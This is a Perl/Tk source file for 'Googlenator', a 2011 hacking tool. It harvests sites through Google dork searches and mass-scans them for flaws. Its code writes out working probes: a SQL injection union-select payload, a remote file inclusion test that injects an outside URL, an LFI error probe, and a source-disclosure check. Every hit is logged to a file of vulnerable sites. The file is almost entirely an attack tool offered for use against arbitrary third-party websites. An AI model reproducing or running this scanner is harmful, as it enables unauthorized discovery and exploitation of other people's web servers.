#!usr/bin/perl
#Googlenator (C) Doddy Hackman 2011

use Tk;
use Tk::ROText;
use Tk::FileSelect;
use URI::Split qw(uri_split);
use Cwd;
use WWW::Mechanize;

if ($^O eq 'MSWin32') {
use Win32::Console; 
Win32::Console::Free();
}

my $nave = WWW::Mechanize->new(autocheck => 0);
$nave->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12");

installer();

my $new = MainWindow->new(-background=>"black");

$new->title("Googlenator (C) Doddy Hackman 2011");
$new->geometry("780x530");
$new->resizable(0,0);

$d = $new->Frame(-relief=>"sunken",-bd=>1,-background=>"black",-foreground=>"cyan");
my $scanx = $d->Menubutton(-text=>"Scan",-underline=>1,-background=>"black",-foreground=>"cyan",-activeforeground=>"cyan")->pack(-side=>"left");
my $logsx = $d->Menubutton(-text=>"Logs",-underline=>1,-background=>"black",-foreground=>"cyan",-activeforeground=>"cyan")->pack(-side=>"left");
$d->pack(-side=>"top",-fill=>"x");

$scanx->command(-label=>"SQL",-background=>"black",-foreground=>"cyan",-command=>\&loadsql);
$scanx->command(-label=>"RFI",-background=>"black",-foreground=>"cyan",-command=>\&loadrfi);
$scanx->command(-label=>"LFI",-background=>"black",-foreground=>"cyan",-command=>\&loadlfi);
$scanx->command(-label=>"FSD",-background=>"black",-foreground=>"cyan",-command=>\&loadfsd);

$logsx->command(-label=>"GoogleSearchs",-background=>"black",-foreground=>"cyan",-command=>\&loadgoogle);
$logsx->command(-label=>"SQL",-background=>"black",-foreground=>"cyan",-command=>\&loadfilesql);
$logsx->command(-label=>"RFI",-background=>"black",-foreground=>"cyan",-command=>\&loadfilerfi);
$logsx->command(-label=>"LFI",-background=>"black",-foreground=>"cyan",-command=>\&loadfilelfi);
$logsx->command(-label=>"FSD",-background=>"black",-foreground=>"cyan",-command=>\&loadfilefsd);

my $box = $new->ROText(-background=>"black",-foreground=>"cyan",-width=> 104,-height=> 20)->place(-x =>20,-y=>60);
head();

$new->Label(-background=>"black",-foreground=>"cyan",-text=>"Google : ",-font=>"Impact")->place(-y=>"380",-x=>"20");

my $google = $new->Entry(-background=>"black",-foreground=>"cyan",-width=>"30",-text=>"www.google.com.ar")->place(-x=>"80",-y=>"385");

$new->Label(-background=>"black",-foreground=>"cyan",-text=>"Pages : ",-font=>"Impact")->place(-y=>"380",-x=>"300");

my $pages = $new->Entry(-background=>"black",-foreground=>"cyan",-width=>"5",-text=>"30")->place(-y=>"385",-x=>"354");

$new->Label(-background=>"black",-foreground=>"cyan",-font=>"Impact",-text=>"Dorks : ")->place(-y=>"380",-x=>"450");

my $dorks = $new->Entry(-background=>"black",-foreground=>"cyan",-width=>"40",-text=>"index.php+id")->place(-y=>"385",-x=>"505");

$new->Button(-text=>"Search in Google",-background=>"black",-foreground=>"cyan",-activeforeground=>"cyan",-width=>"130",-command=>\&googler)->place(-y=>"450");
$new->Button(-text=>"About",-background=>"black",-foreground=>"cyan",-activeforeground=>"cyan",-width=>"130",-command=>\&about)->place(-y=>"474");
$new->Button(-text=>"Exit",-background=>"black",-foreground=>"cyan",-activeforeground=>"cyan",-width=>"130",-command=>\&exitx)->place(-y=>"498");
	
MainLoop;

head();

sub googler {

my $google = $google->get;
my $pages = $pages->get;
my $dorks = $dorks->get;

head();

$box->insert("end","\t\t[+] Searching pages with string $dorks\n\n");

my @webas = google($google,$dorks,$pages);

$box->insert("end","\t\t[+] Cleaning\n\n");
$box->insert("end","\t\t[+] Webs Found ".int(@webas)."\n\n");

for(@webas) {
$new->update();
$box->insert("end","\t\t[Link] : ".$_."\n");
savefile($dorks.".txt",$_);
}

$box->insert("end","\n\t\t[+] All save in logs/search/".$dorks."\n");
$box->insert("end","\t\t[+] Finished\n\n");
	
}

sub loadsql {
 
$browse = $new->FileSelect(-directory => "/");
my $filea = $browse->Show;

head();
$box->insert("end","\t\t[+] File : $filea\n");

open (FILE,$filea);
@words = <FILE>;
close FILE;

chomp @words;

$box->insert("end","\t\t[+] Webs Found : ".int(@words)."\n\n");

for my $page(@words) {
my $page = clean($page);
$new->update();
scansql($page);
}

sub scansql {
my ($pass1,$pass2) = ("+","--");
my $page = shift;
$code1 = toma($page."-1".$pass1."union".$pass1."select".$pass1."666".$pass2);
if ($code1=~/The used SELECT statements have a different number of columns/ig) {
$box->insert("end","\t\t[+] SQLI : $page\n");
savefilevul("sql-logs.txt",$page);
}}}

sub loadrfi {
 
$browse = $new->FileSelect(-directory => "/");
my $filea = $browse->Show;

head();
$box->insert("end","\t\t[+] File : $filea\n");

open (FILE,$filea);
@words = <FILE>;
close FILE;

chomp @words;

$box->insert("end","\t\t[+] Webs Found : ".int(@words)."\n\n");

for my $page(@words) {
my $page = clean($page);
$new->update();
scanrfi($page);
}

sub scanrfi {
my $page = shift;
$code1 = toma($page."http:/www.supertangas.com/");
if ($code1=~/Los mejores TANGAS de la red/ig) { #Esto es conocimiento de verdad xDDD
$box->insert("end","\t\t[+] RFI : $page\n");
savefilevul("rfi-logs.txt",$page);
}}}

sub loadlfi {
 
$browse = $new->FileSelect(-directory => "/");
my $filea = $browse->Show;

head();
$box->insert("end","\t\t[+] File : $filea\n");

open (FILE,$filea);
@words = <FILE>;
close FILE;

chomp @words;

$box->insert("end","\t\t[+] Webs Found : ".int(@words)."\n\n");

for my $page(@words) {
my $page = clean($page);
$new->update();
scanlfi($page);
}


sub scanlfi {
my $page = shift;
$code1 = toma($page."'");
if ($code1=~/No such file or directory in <b>(.*)<\/b> on line/ig) {
$box->insert("end","\t\t[+] LFI : $page\n");
savefilevul("lfi-logs.txt",$page);
}}}

sub loadfsd {
 
$browse = $new->FileSelect(-directory => "/");
my $filea = $browse->Show;

head();
$box->insert("end","\t\t[+] File : $filea\n");

open (FILE,$filea);
@words = <FILE>;
close FILE;

chomp @words;

$box->insert("end","\t\t[+] Webs Found : ".int(@words)."\n\n");

for my $page(@words) {
my $page = clean($page);
$new->update();
scanfsd($page);
}

sub scanfsd {
my $page = shift;
my ($scheme, $auth, $path, $query, $frag)  = uri_split($page);
if ($path=~/\/(.*)$/) { 
my $me = $1;
$code1 = toma($page.$me);
if ($code1=~/header\((.*)Content-Disposition: attachment;/ig) {
$box->insert("end","\t\t[+] Full Source Discloure : $page\n");
savefilevul("fsd-logs.txt",$page);
}}}}

sub head {

$box->delete("0.0","end");

$box->insert("end","
           @@@@     @@@      @@@      @@@@   @@   @@@@ @@   @@    @@   @@@@@@  @@@    @@@@  
          @@@@@    @@@@@    @@@@@    @@@@@   @@   @@   @@@  @@    @@     @@   @@@@@   @@ @@ 
         @@@      @@   @@  @@   @@  @@@      @@   @@   @@@@ @@   @@@@    @@  @@   @@  @@ @@ 
         @@  @@@  @@   @@  @@   @@  @@  @@@  @@   @@@@ @@ @ @@   @  @    @@  @@   @@  @@@@  
         @@@  @@  @@   @@  @@   @@  @@@  @@  @@   @@   @@ @@@@  @@@@@@   @@  @@   @@  @@@@  
          @@@@@    @@@@@    @@@@@    @@@@@   @@   @@   @@  @@@  @@  @@   @@   @@@@@   @@ @@ 
           @@@      @@@      @@@      @@@    @@@@ @@@@ @@   @@  @@  @@   @@    @@@    @@  @@



	
");
}

sub about {
$about = MainWindow->new(-background=>"black");
$about->title("Googlenator v0.3");
$about->geometry("300x110");
$about->resizable(0,0);
$about->Label(-background=>"black",-foreground=>"cyan")->pack();
$about->Label(-text=>"Contact : lepuke[at]hotmail[com]",-font=>"Impact",-background=>"black",-foreground=>"cyan")->pack();
$about->Label(-text=>"Web : doddyhackman.webcindario.com",-font=>"Impact",-background=>"black",-foreground=>"cyan")->pack();
$about->Label(-text=>"Blog : doddy-hackman.blogspot.com",-font=>"Impact",-background=>"black",-foreground=>"cyan")->pack();
}

sub exitx {
exit(1);
}

sub savefilevul {
open (SAVE,">>logs/vulz/".$_[0]);
print SAVE $_[1]."\n";
close SAVE; 
}

sub toma {
return $nave->get($_[0])->content;
}

sub dame_link {
return $nave->find_all_links();
}

sub clean {
if ($_[0] =~/\=/) {
my @sacar= split("=",$_[0]);
return(@sacar[0]."=");
}
}

sub savefile {
open (SAVE,">>logs/search/".$_[0]);
print SAVE $_[1]."\n";
close SAVE; 
}

sub google {

for ($pages=10;$pages<=$_[2];$pages=$pages+10) {
$new->update();
toma("http://$_[0]/search?hl=&q=$_[1]&start=$pages");
@links = dame_link();
for my $l(@links) {
if ($l->url() =~/webcache.googleusercontent.com/) {
push(@url,$l->url());
}
}
}

for(@url) {
if ($_ =~/cache:(.*?):(.*?)\+/) {
push(@founds,$2);
}
}

my @founds = repes(@founds);

return @founds; 
}


sub installer {

unless (-d "logs/") {
mkdir("logs/","777");
mkdir("logs/search","777");
mkdir("logs/vulz","777");
}
}

sub repes {
foreach my $palabra ( @_ ) {
next if $repety{ $palabra }++;
push @revisado,$palabra;
}
return @revisado;
}

sub loadgoogle {
system("start ".getcwd()."/logs/search/");
}

sub loadfilesql {
system("start logs/vulz/sql-logs.txt");
}


sub loadfilelfi {
system("start logs/vulz/lfi-logs.txt");
}


sub loadfilerfi {
system("start logs/vulz/rfi-logs.txt");
}


sub loadfilefsd {
system("start logs/vulz/fsd-logs.txt");
}

# ¿ The End ? 